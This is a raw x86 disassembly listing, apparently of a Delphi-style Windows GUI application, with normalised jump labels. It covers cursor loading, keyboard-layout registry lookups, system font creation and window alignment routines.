retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_47ed7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47eed1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4950dc
dec eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_494f40
mov dl 0x5
mov eax [ ebp - 0xc ]
call sub_48d260
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_48df00
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449e68
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eed8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_4795d4
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov ecx ebx
mov eax [ ebp - 0xc ]
call sub_48df10
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_48dfa0
mov ebx 0x1
mov edi r-xdata
cmp [ eax + ebx * 2 - 0x2 ] 0x100
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ eax + ebx * 2 - 0x2 ]
movzx eax al
bt [ edi ] eax
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test al al
je r-xdata
mov al 0x1
inc ebx
dec esi
jne r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_449fd0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_47eedf
add [ eax ] al
and al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x604ae8c3 ]
add [ eax ] eax
mov eax ebx
call sub_4950dc
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47e060
sub_47ef20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_492534
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_478bc0
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4924f8
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4483f8
inc ebp
dec edi
jne r-xdata
sub_47ef6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4950dc
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47ef98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47ca84
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_47efc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_47caa8
cmp [ ebx + 0x8b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
jne r-xdata
mov eax ebx
call sub_4950dc
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_496868
push eax
call PostMessageW
cmp [ ebx + 0x286 ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4950f0
or ecx 0xffffffff
mov dl 0x1
call sub_48e71c
pop esi
pop ebx
retn
sub_47f054
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_495ec0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax ebx
call sub_48f2b0
mov edi [ esi + 0x4 ]
cmp ebx [ edi + 0x90 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_48d81c
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4483f8
sub_47f0ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47f1f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_48df00
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449e68
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub eax 0xafff
jne r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f1fd
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebx + 0x4 ]
movzx edx [ eax + 0x57 ]
mov eax [ ebp - 0x8 ]
call sub_4795d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx esi
call sub_48df10
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_48dfa0
mov ebx 0x1
mov edi sub_47f204
cmp [ eax + ebx * 2 - 0x2 ] 0x100
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ eax + ebx * 2 - 0x2 ]
movzx eax al
bt [ edi ] eax
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test al al
je r-xdata
mov al 0x1
inc ebx
dec esi
jne r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_449fd0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_47f204
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx + 0x61eee8d3 ]
add [ eax ] eax
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_48d260
pop ebx
retn
sub_47f23c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_495c10
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4950dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4950f0
movzx edx [ ebx + 0x57 ]
call sub_48deb0
inc edi
dec esi
jne r-xdata
sub_47f2e4
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_47f314
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_47f368
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e278
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_47f77c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_47f788
mov eax ebx
call sub_47f794
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x74 ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_47a7b8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov [ ebx + 0x7c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov [ ebx + 0x80 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov [ ebx + 0x78 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov [ ebx + 0x84 ] eax
mov eax ebx
call sub_47fc8c
mov eax [ ebx + 0x7c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_47fb64
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_47fb64
mov eax [ ebx + 0x78 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_47fb64
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_47fb64
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_47f4d4
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x84 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x78 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x80 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x7c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x54 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x50 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x4c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x30 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x34 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ ebp + 0x74 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
lea eax [ ebp + 0x58 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax ebp
call sub_47f7f4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_42e2c4
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4246e8
call sub_4481b0
inc edi
dec esi
jne r-xdata
sub_47f6a8
push ebx
mov ebx eax
mov eax [ ebx + 0x60 ]
cmp eax [ ebx + 0x6c ]
je r-xdata
mov eax [ ebx + 0x5c ]
cmp eax [ ebx + 0x68 ]
je r-xdata
mov [ ebx + 0x6c ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x68 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_47f6f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_424590
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_424590
mov eax [ rw-data ]
call sub_483168
sub_47f72c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4248a0
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4248a0
mov eax [ rw-data ]
call sub_483168
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x80 ]
call sub_498364
sub_47f794
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorW
mov [ ebp + 0xa4 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorW
mov ecx eax
mov edx ebx
mov eax ebp
call sub_47f8d8
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_47f7f4
push ebx
push esi
push edi
push ebp
mov ebp eax
mov ebx [ ebp + 0xa0 ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorW
mov edx [ ebp + 0xa4 ]
cmp eax edx
je r-xdata
mov esi [ ebx + 0x4 ]
cmp esi 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp esi 0xffffffeb
je r-xdata
cmp esi 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jle r-xdata
mov edi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4474a8
mov ebx edi
test ebx ebx
jne r-xdata
sub_47f858
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47f654
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_47f640
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_47f640
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jne r-xdata
sub_47f8ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push ebp
call sub_47f858
pop ecx
test eax eax
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_480674
push ebp
call sub_47f858
pop ecx
sub_47f8d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_44748c
mov edx [ ebx + 0xa0 ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0xa0 ] eax
pop edi
pop esi
pop ebx
retn
sub_47f904
push ebp
mov ebp esp
add esp 0xfffffc60
push ebx
xor edx edx
mov [ ebp - 0x3a0 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47fab1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fab8
lea eax [ ebp - 0x3a0 ]
call j_sub_449348
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
xor edx edx
call sub_449d2c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x29 ] 0x0
mov dl 0x1
call sub_427028
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x39c ] eax
mov [ ebp - 0x398 ] 0x0
lea ecx [ ebp - 0x39c ]
mov edx r-xdata
lea eax [ ebp - 0x394 ]
call sub_4364b8
push eax
push 0x80000002
call RegOpenKeyExW
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_49c3a0
test al al
je r-xdata
xor eax eax
push ebp
push sub_47fa6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x200
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExW
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x3a0 ]
lea edx [ ebp - 0x314 ]
mov ecx 0x100
call sub_449f14
mov edx [ ebp - 0x3a0 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x314 ]
mov ecx 0x100
call sub_449f14
sub_47fb64
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_482f8c
cmp esi [ ebx + 0x78 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_482cc0
mov dl 0x1
mov eax [ rw-data ]
call sub_482cc0
sub_47fbcc
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0xa0 ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0xa4 ]
jmp r-xdata
mov ecx [ ecx ]
sub_47fbf8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_47fbcc
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax [ esp ]
and eax 0xffff
mov edx [ esp + 0x4 ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x84
push edi
call SendMessageW
movzx eax ax
or eax 0x2000000
push eax
push edi
push 0x20
push edi
call SendMessageW
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47fc8c
push ebp
mov ebp esp
add esp 0xfffffdac
push ebx
push esi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_47fe07
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + 0x84 ]
mov [ ebp - 0x1 ] al
mov esi 0x5c
push 0x0
lea eax [ ebp - 0x60 ]
push eax
push esi
push 0x1f
call SystemParametersInfoW
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_482cc0
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x7c ]
call sub_46d808
lea eax [ ebp - 0x60 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x7c ]
call sub_46d808
jmp r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x8
call sub_46d93c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_46d808
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_46d808
lea eax [ ebp - 0x118 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x78 ]
call sub_46d808
lea eax [ ebp - 0x174 ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_46d808
lea eax [ ebp - 0xbc ]
push eax
call CreateFontIndirectW
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_46d808
jmp r-xdata
mov esi 0x1f4
mov [ ebp - 0x254 ] esi
push 0x0
lea eax [ ebp - 0x254 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoW
test eax eax
je r-xdata
retn
movzx edx [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_482cc0
mov eax [ ebx + 0x78 ]
mov edx 0xff000017
call sub_46d5ac
mov eax [ ebx + 0x80 ]
mov edx 0xff000007
call sub_46d5ac
mov eax [ ebx + 0x84 ]
mov edx 0xff000008
call sub_46d5ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fe0e
cmp [ rw-data ] 0x0
je r-xdata
sub_47fe44
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
dec cl
je r-xdata
mov eax esi
call sub_479188
mov ebx eax
mov eax edi
call sub_479188
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_479188
mov ebx eax
add ebx [ edi + 0x4c ]
mov eax esi
call sub_479188
add eax [ esi + 0x4c ]
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax esi
call sub_479168
mov ebx eax
mov eax edi
call sub_479168
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax edi
call sub_479168
mov ebx eax
add ebx [ edi + 0x48 ]
mov eax esi
call sub_479168
add eax [ esi + 0x48 ]
cmp ebx eax
setl al
jmp r-xdata
sub_47fecc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
movzx eax [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x283 ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_479168
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_479188
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x88 ]
cmp [ ebx + 0x283 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_480012 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
